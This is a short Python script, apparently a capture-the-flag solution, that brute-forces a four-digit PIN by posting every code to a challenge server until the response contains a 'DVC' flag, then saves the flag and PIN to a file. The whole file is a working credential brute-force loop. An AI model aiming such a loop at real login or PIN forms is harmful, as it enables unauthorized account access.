import requests

url = "http://davincicode.fr:6969/"

for i in range(0, 9999):
	generate_pin = "0" * (4 - len(str(i))) + str(i)
	pin = {'code': generate_pin}
	x = requests.post(url, data = pin)
	print(generate_pin)
	
	if "DVC" in x.text:
		with open('LePin.txt', 'w') as f:
			f.write("Here is the FLAG : " + x.text + " and this is the PIN that allows you to find it on the site : " + generate_pin)
			print("PIN FOUND !!! C'est le " + generate_pin)
			exit()
